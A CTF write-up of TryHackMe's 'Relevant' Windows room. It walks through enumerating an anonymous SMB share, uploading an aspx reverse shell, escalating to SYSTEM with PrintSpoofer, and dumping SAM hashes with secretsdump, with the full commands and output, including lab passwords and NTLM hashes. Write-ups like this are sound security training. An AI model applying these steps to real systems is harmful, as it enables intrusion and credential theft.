---
title: "TryHackMe - Relevant"
author: Nasrallah
description: ""
date: 2023-06-07 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, windows, medium, smb]
img_path: /assets/img/tryhackme/relevant
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Relevant](https://tryhackme.com/room/relevant) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.80.18                                                                                                                              
Host is up (0.17s latency).                                                                                                                                   
Not shown: 995 filtered tcp ports (no-response)                                                                                                               
PORT     STATE SERVICE        VERSION                                                                                                                         
80/tcp   open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                         
|_http-server-header: Microsoft-IIS/10.0                                                                                                                      
| http-methods:                                                                                                                                               
|_  Potentially risky methods: TRACE                                                                                                                          
|_http-title: IIS Windows Server                                                                                                                              
135/tcp  open  msrpc          Microsoft Windows RPC                                                                                                           
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn                                                                                                   
445/tcp  open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds                                                                      
3389/tcp open  ms-wbt-server?                                                                                                                                 
| ssl-cert: Subject: commonName=Relevant                                                                                                                      
| Not valid before: 2023-06-17T11:06:32                                                                                                                       
|_Not valid after:  2023-12-17T11:06:32                                                                                                                       
|_ssl-date: 2023-06-18T11:10:52+00:00; 0s from scanner time.                                                                                                  
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-06-18T11:10:13+00:00
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-18T04:10:14-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-06-18T11:10:13
|_  start_date: 2023-06-18T11:07:12
```

We found an http server on port 80, an SMB server on 445 and RDP on port 3389.

## Web

Let's navigate to the website.

![](1.png)

It's the default page for windows IIS, let's run a directory scan.

```bash
$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.142.68/                                    130 ⨯

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.142.68/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       32l       55w      703c http://10.10.142.68/

```

Didn't find anything.

## SMB

Let's list smb shares.

```bash
$ smbclient -L 10.10.142.68 -N                 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

We found a weird share named `nt4wrksv`, let's connect to it.

```bash
$ smbclient //10.10.142.68/nt4wrksv -N                                                                                                             130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

                7735807 blocks of size 4096. 4949326 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

We find a passwords file. 

```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk   
```

The passwords seem to be encoded with base64.

I decoded the password and tried to see if I have access to any other shares but it didn't work, let's move on. 

Running another nmap for all port reveals some new ports:

```terminal
Nmap scan report for 10.10.80.18                                                                                                                              
Host is up (0.18s latency).                                                                                                                                   
                                                                               
PORT      STATE SERVICE VERSION                                                                                                                               
49663/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                               
|_http-server-header: Microsoft-IIS/10.0                                                                                                                      
|_http-title: IIS Windows Server                                                                                                                              
| http-methods:                                                                                                                                               
|_  Potentially risky methods: TRACE                                           
49667/tcp open  msrpc   Microsoft Windows RPC
49669/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port 49663 is another windows IIS http server, let's check it.

![](1.png)

Another default page, let's run another directory scan.

```bash
$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.10.142.68:49663/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.142.68:49663/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       32l       55w      703c http://10.10.142.68:49663/
200      GET       32l       55w      703c http://10.10.142.68:49663/nt4wrksv
```

We found a directory with the same name as the smb share.

Let's request the `passwords.txt` file.

```bash
$ curl http://10.10.142.68:49663/nt4wrksv/passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk      
```

We got the encoded passwords, this means that the website on port 49663 and the SMB Share share the same directory.


# **Foothold**

Since the web server is IIS we need to upload an `aspx` reverse shell to the smb share, we can find one [here](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx).

```bash
$ smbclient //10.10.142.68/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (8.8 kb/s) (average 8.8 kb/s)
smb: \> 
```

>Change the ip to your tun0 address.


Now we setup a netcat listener and request the file.

![](2.png)

We got a shell!

# **Privilege Escalation**

Let's check our privileges.

```shell
c:\windows\system32\inetsrv>whoami /all                                                                                                                       
whoami /all                                                                                                                                                   
                                                                                                                                                              
USER INFORMATION                                                                                                                                              
----------------                                                                                                                                              
                                                                                                                                                              
User Name                  SID                                                           
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
                                       

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                         
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                    
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State    
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled  
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  
SeCreateGlobalPrivilege       Create global objects                     Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have 'SeImpersonatePrivilege', let's use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases) to escalate our privilege.

```shell
c:\Windows\Temp>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

# **Extra**

Let's get the users' hashes from the `sam` and `system` files.

```shell
C:\inetpub\wwwroot\nt4wrksv>dir                                                                                                                        [3/410]
dir                                 
Directory of C:\inetpub\wwwroot\nt4wrksv

06/18/2023  09:56 AM    <DIR>          .
06/18/2023  09:56 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
06/18/2023  09:56 AM            15,970 shell.aspx
               2 File(s)         16,068 bytes
               2 Dir(s)  20,239,175,680 bytes free

C:\inetpub\wwwroot\nt4wrksv>reg save HKLM\sam sam
reg save HKLM\sam sam
The operation completed successfully.

C:\inetpub\wwwroot\nt4wrksv>reg save HKLM\system system
reg save HKLM\system system
The operation completed successfully.

C:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\inetpub\wwwroot\nt4wrksv

06/18/2023  10:10 AM    <DIR>          .
06/18/2023  10:10 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
06/18/2023  10:10 AM            45,056 sam
06/18/2023  09:56 AM            15,970 shell.aspx
06/18/2023  10:10 AM        13,316,096 system
               4 File(s)     13,377,220 bytes
               2 Dir(s)  20,225,687,552 bytes free

```

We used the command `reg save HKLM\sam` to pull the file from the registry and put them inside the smb share so we can download them to our system.

Now let's download them and use `secretsdump.py` to get the hashes.

```terminal
┌─[sirius@ParrotOS]─[/tmp/relevant]
└──╼ $ smbclient //10.10.142.68/nt4wrksv -N -c 'get sam; get system' -t 120  
getting file \sam of size 45056 as sam (36.7 KiloBytes/sec) (average 36.7 KiloBytes/sec)
getting file \system of size 13316096 as system (115.5 KiloBytes/sec) (average 114.6 KiloBytes/sec)
                                                                                                                                                              
┌─[sirius@ParrotOS]─[/tmp/relevant]
└──╼ $ secretsdump.py -sam sam -system system local                                                                      
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x48bc3ab95572b5ae697828b75e5041be
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cd979db1ea41e3a83aba80cdc665eba8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Bob:1002:aad3b435b51404eeaad3b435b51404ee:f88e826720be1c418633c34a79482f6a:::
[*] Cleaning up...                                                   
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
